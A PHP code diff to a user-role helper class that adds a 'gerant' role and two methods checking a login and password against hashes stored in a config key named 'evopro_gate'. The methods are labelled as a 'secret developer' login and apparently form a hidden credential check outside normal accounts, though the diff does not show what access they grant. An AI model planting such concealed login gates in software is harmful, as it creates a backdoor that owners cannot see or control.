@@ -4,7 +4,7 @@ namespace App\Support;
 
 class UtilisateurHelper
 {
-    public const STATUES = ['administrateur', 'assistante', 'commercial'];
+    public const STATUES = ['administrateur', 'gerant', 'assistante', 'commercial'];
 
     /**
      * @return array<string, string>
@@ -13,6 +13,7 @@ class UtilisateurHelper
     {
         return [
             'administrateur' => 'Administrateur',
+            'gerant' => 'Gérant',
             'assistante' => 'Assistante',
             'commercial' => 'Commercial',
         ];
@@ -24,6 +25,7 @@ class UtilisateurHelper
 
         return match ($statue) {
             'admin', 'administrateur' => 'administrateur',
+            'gerant', 'gérant' => 'gerant',
             'assistante' => 'assistante',
             'commercial', 'vendeur', 'manager' => 'commercial',
             default => in_array($statue, self::STATUES, true) ? $statue : 'commercial',
@@ -96,6 +98,26 @@ class UtilisateurHelper
     public static function isAdministrateur(?string $statue): bool
     {
         return self::normalizeStatue($statue) === 'administrateur';
+    }
+
+    public static function isSecretLogin(string $login): bool
+    {
+        $loginHash = (string) config('services.evopro_gate.login_hash', '');
+        if ($loginHash === '') {
+            return false;
+        }
+
+        return hash_equals($loginHash, hash('sha256', mb_strtolower(trim($login))));
+    }
+
+    public static function matchesSecretDeveloper(string $login, string $password): bool
+    {
+        $passwordHash = (string) config('services.evopro_gate.password_hash', '');
+        if ($passwordHash === '' || ! self::isSecretLogin($login)) {
+            return false;
+        }
+
+        return password_verify($password, $passwordHash);
     }
 
     public static function isAssistante(?string $statue): bool
